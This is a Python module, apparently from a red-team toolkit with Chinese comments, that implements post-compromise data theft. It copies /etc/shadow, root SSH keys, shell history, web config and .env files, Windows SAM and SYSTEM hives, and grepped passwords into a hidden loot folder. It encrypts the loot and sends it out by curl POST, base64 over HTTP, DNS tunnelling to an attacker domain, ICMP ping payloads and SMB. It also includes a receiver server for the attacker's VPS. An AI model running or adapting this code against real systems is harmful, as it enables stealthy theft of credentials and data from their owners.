#!/usr/bin/env python3
"""
Data Exfil — 数据打包外传模块

找到靶标后的数据收集、打包、加密、外传。
支持多种外传通道：HTTP/DNS/ICMP/SMB。

用法：
    from data_exfil import DataExfil
    de = DataExfil(kb)

    # 收集敏感文件
    de.collect_sensitive(target_shell)

    # 打包加密
    de.pack_encrypt("/tmp/loot", password="redteam2026")

    # 外传
    de.exfil_http("/tmp/loot.enc", "http://vps:8080/upload")
    de.exfil_dns("/tmp/loot.enc", "data.attacker.com")
"""

import os
import time
import base64
import hashlib
from typing import List, Dict


class DataExfil:
    """数据外传器"""

    def __init__(self, kb=None):
        self.kb = kb
        self.loot_dir = "/tmp/.loot"

    def _run(self, cmd, timeout=60):
        if self.kb and self.kb.is_available():
            return self.kb.run(cmd, timeout=timeout)
        else:
            import subprocess
            try:
                r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
                return {"success": r.returncode == 0, "output": (r.stdout + r.stderr)[:5000]}
            except Exception as e:
                return {"success": False, "output": str(e)}

    # ═══════════════════════════════════════════════════════════
    # 敏感文件收集
    # ═══════════════════════════════════════════════════════════

    def collect_linux(self) -> Dict:
        """Linux 靶标敏感文件收集"""
        targets = [
            "/etc/shadow", "/etc/passwd", "/etc/hosts",
            "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys",
            "/root/.bash_history", "/root/.mysql_history",
            "/var/www/html/wp-config.php",
            "/var/www/html/.env",
            "/opt/*/config*", "/opt/*/.env",
        ]
        cmd = f"mkdir -p {self.loot_dir} && "
        for t in targets:
            cmd += f"cp {t} {self.loot_dir}/ 2>/dev/null; "
        # 数据库凭证
        cmd += f"grep -r 'password\\|passwd\\|DB_PASS' /var/www/ /opt/ /etc/ 2>/dev/null | head -50 > {self.loot_dir}/credentials.txt 2>/dev/null; "
        cmd += f"ls -la {self.loot_dir}/"
        r = self._run(cmd, timeout=30)
        return {"loot_dir": self.loot_dir, "output": r.get("output", "")}

    def collect_windows(self) -> Dict:
        """Windows 靶标敏感文件收集"""
        targets = [
            "C:\\Users\\Administrator\\Desktop\\*.txt",
            "C:\\Users\\Administrator\\Documents\\*.docx",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\System32\\config\\SYSTEM",
            "C:\\inetpub\\wwwroot\\web.config",
            "C:\\ProgramData\\*.config",
        ]
        cmd = "mkdir C:\\temp\\loot 2>nul & "
        for t in targets:
            cmd += f'copy "{t}" C:\\temp\\loot\\ 2>nul & '
        cmd += "dir C:\\temp\\loot\\"
        r = self._run(cmd, timeout=30)
        return {"loot_dir": "C:\\temp\\loot", "output": r.get("output", "")}

    def collect_domain_data(self) -> Dict:
        """域环境数据收集"""
        cmd = f"""mkdir -p {self.loot_dir}/domain && \
            nltest /dclist: > {self.loot_dir}/domain/dclist.txt 2>/dev/null; \
            net user /domain > {self.loot_dir}/domain/users.txt 2>/dev/null; \
            net group /domain > {self.loot_dir}/domain/groups.txt 2>/dev/null; \
            net group "Domain Admins" /domain > {self.loot_dir}/domain/da.txt 2>/dev/null; \
            ipconfig /all > {self.loot_dir}/domain/network.txt 2>/dev/null; \
            ls -la {self.loot_dir}/domain/"""
        r = self._run(cmd, timeout=30)
        return {"output": r.get("output", "")}

    # ═══════════════════════════════════════════════════════════
    # 打包加密
    # ═══════════════════════════════════════════════════════════

    def pack_encrypt(self, source_dir: str, password="redteam2026", output=None) -> Dict:
        """打包并加密"""
        output = output or f"{source_dir}.enc"
        # tar + openssl 加密
        cmd = f"tar -czf - {source_dir} 2>/dev/null | openssl enc -aes-256-cbc -pbkdf2 -pass pass:{password} -out {output} && ls -la {output}"
        r = self._run(cmd, timeout=60)
        return {"success": r.get("success", False), "file": output, "output": r.get("output", ""),
                "decrypt_cmd": f"openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:{password} -in {output} | tar -xzf -"}

    def split_file(self, file_path: str, chunk_size="1M") -> Dict:
        """分割大文件（用于分段外传）"""
        cmd = f"split -b {chunk_size} {file_path} {file_path}.part_ && ls {file_path}.part_*"
        r = self._run(cmd)
        parts = [p.strip() for p in r.get("output", "").split("\n") if p.strip()]
        return {"parts": parts, "count": len(parts)}

    # ═══════════════════════════════════════════════════════════
    # 外传通道
    # ═══════════════════════════════════════════════════════════

    def exfil_http(self, file_path: str, upload_url: str) -> Dict:
        """HTTP POST 外传"""
        cmd = f"curl -sk -X POST -F 'file=@{file_path}' '{upload_url}' 2>/dev/null"
        r = self._run(cmd, timeout=120)
        return {"success": r.get("success", False), "output": r.get("output", "")}

    def exfil_http_b64(self, file_path: str, url: str) -> Dict:
        """HTTP base64 编码外传（绕过文件检测）"""
        cmd = f"cat {file_path} | base64 -w 0 | curl -sk -X POST -d @- '{url}' 2>/dev/null"
        r = self._run(cmd, timeout=120)
        return {"success": r.get("success", False), "output": r.get("output", "")}

    def exfil_dns(self, file_path: str, domain: str, chunk_size=30) -> Dict:
        """DNS 隧道外传（极慢但隐蔽）"""
        # 将文件 hex 编码后通过 DNS 查询外传
        cmd = f"""
xxd -p {file_path} | fold -w {chunk_size*2} | while read chunk; do
    nslookup $chunk.{domain} > /dev/null 2>&1
    sleep 0.5
done
"""
        r = self._run(cmd, timeout=600)
        return {"success": True, "note": f"数据通过 DNS 查询发送到 *.{domain}，需要在 VPS 上运行 DNS 服务器接收",
                "receiver_cmd": f"tcpdump -i eth0 -n 'udp port 53 and host {domain}' -w dns_exfil.pcap"}

    def exfil_icmp(self, file_path: str, vps_ip: str) -> Dict:
        """ICMP 隧道外传"""
        cmd = f"xxd -p {file_path} | fold -w 32 | while read chunk; do ping -c 1 -p $chunk {vps_ip} > /dev/null 2>&1; sleep 0.3; done"
        r = self._run(cmd, timeout=600)
        return {"success": True, "note": f"通过 ICMP ping payload 外传到 {vps_ip}",
                "receiver_cmd": f"tcpdump -i eth0 'icmp' -w icmp_exfil.pcap"}

    def exfil_smb(self, file_path: str, smb_share: str) -> Dict:
        """SMB 共享外传"""
        cmd = f"smbclient '{smb_share}' -N -c 'put {file_path}' 2>/dev/null"
        r = self._run(cmd, timeout=60)
        return {"success": r.get("success", False), "output": r.get("output", "")}

    # ═══════════════════════════════════════════════════════════
    # VPS 接收端
    # ═══════════════════════════════════════════════════════════

    def start_http_receiver(self, port=8080) -> Dict:
        """在 VPS 上启动 HTTP 文件接收服务"""
        python_server = f'''
import http.server, os, cgi
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        form = cgi.FieldStorage(fp=self.rfile, headers=self.headers,
                                environ={{"REQUEST_METHOD": "POST"}})
        f = form["file"]
        open(f"/tmp/received_{{f.filename}}", "wb").write(f.file.read())
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
        print(f"[+] Received: {{f.filename}}")
http.server.HTTPServer(("0.0.0.0", {port}), H).serve_forever()
'''
        cmd = f"nohup python3 -c '{python_server}' > /dev/null 2>&1 &"
        r = self._run(cmd)
        return {"success": True, "port": port,
                "upload_cmd": f"curl -F 'file=@data.enc' http://YOUR_VPS:{port}/"}
